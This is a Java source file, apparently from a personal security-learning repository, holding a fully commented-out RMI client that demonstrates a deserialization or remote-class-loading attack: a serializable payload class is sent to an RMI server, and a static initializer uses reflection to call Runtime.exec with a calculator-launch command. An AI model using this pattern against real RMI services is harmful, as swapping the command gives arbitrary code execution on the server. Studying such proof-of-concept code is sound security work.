package com.xjjlearning.hack.java.codebase;

/**
 * created by xjj on 2023/1/25
 */
// public class RMIClient implements Serializable {
//     static {
//         try {
//             String command = "open -a Calculator";
//             Class<?> clazz = Class.forName("java.lang.Runtime");
//             Runtime runtime = (Runtime) clazz.getMethod("getRuntime").invoke(clazz);
//             clazz.getMethod("exec", String.class).invoke(runtime, command);
//         } catch (Exception ignore) {
//         }
//     }
//
//     private static final long serialVersionUID = 1L;
//
//     public class PayLoad extends ArrayList<Integer> {
//     }
//
//     final private String uri = "rmi://192.168.31.141:1099";
//
//     public void lookup() throws Exception {
//         ICalc r = (ICalc) Naming.lookup(uri + "/refObj");
//         List<Integer> i = new PayLoad();
//         i.add(1);
//         i.add(2);
//         System.out.println(r.sum(i));
//     }
//
//     public String[] list() throws MalformedURLException, RemoteException {
//         return Naming.list(uri);
//     }
//
//     public static void main(String[] args) throws Exception {
//         RMIClient rmiClient = new RMIClient();
//         // Arrays.stream(rmiClient.list()).forEach(System.out::println);
//         rmiClient.lookup();
//     }
// }
